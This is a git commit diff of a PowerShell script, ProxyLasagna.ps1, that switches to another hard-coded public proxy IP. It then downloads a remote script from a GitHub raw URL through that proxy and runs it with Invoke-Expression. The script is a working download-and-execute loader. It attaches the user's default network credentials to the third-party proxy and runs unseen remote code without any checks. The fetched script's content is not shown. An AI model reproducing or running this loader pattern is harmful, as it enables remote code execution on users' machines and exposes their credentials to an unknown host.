407c765bdcf58ce002a2b774613ac8a34bb3b8ab
MarkDenkmn <145273692+MarkDenkmn@users.noreply.github.com>
2023-09-21 15:20:35 +0200

    Update ProxyLasagna.ps1

--- ProxyLasagna.ps1
+++ ProxyLasagna.ps1
@@ -1,15 +1,19 @@
 # Set the proxy server information (replace with your proxy server details)
-$proxyServer = "98.162.25.29:31679"
+$proxyServer = "98.188.47.132:4145"
 
 # Set the URL of the PowerShell script you want to run
 $scriptURL = "https://raw.githubusercontent.com/MarkDenkmn/MarkDenkmn/main/Lasagna.ps1"
 
+# Create a proxy object with credentials
+$proxy = New-Object System.Net.WebProxy
+$proxy.Address = $proxyServer
+
 # Set the proxy settings for the current session
-[system.net.webrequest]::defaultwebproxy = New-Object System.Net.WebProxy($proxyServer)
-[system.net.webrequest]::defaultwebproxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials
+[system.net.webrequest]::defaultwebproxy = $proxy
+[system.net.webrequest]::defaultwebproxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
 
 # Download and run the script
-$scriptContent = (New-Object System.Net.WebClient).DownloadString($scriptURL)
+$scriptContent = (Invoke-WebRequest -Uri $scriptURL -Proxy $proxy).Content
 Invoke-Expression -Command $scriptContent
 
 # Remove the proxy settings to avoid affecting other PowerShell sessions
